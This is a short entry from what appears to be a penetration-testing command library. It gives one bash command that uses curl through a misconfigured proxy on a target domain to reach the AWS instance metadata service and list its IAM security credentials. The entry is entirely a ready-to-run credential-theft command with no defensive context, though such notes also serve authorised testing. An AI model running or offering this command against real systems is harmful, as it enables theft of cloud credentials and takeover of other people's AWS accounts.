---
id: 7bfc7121-7398-4a84-89cf-6cc592afdf5d
name: Can potentially hit it externally if a proxy service (like Nginx) is being hosted
  in AWS and misconfigured
type: command
executor: bash
data: 'curl --proxy vulndomain.target.com:80 http://169.254.169.254/latest/meta-data/iam/security-credentials/
  && echo

  '
output: null
created_at: '2020-07-14T19:06:15.104305+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Can potentially hit it externally if a proxy service (like Nginx) is being hosted in AWS and misconfigured

```bash
curl --proxy vulndomain.target.com:80 http://169.254.169.254/latest/meta-data/iam/security-credentials/ && echo

```


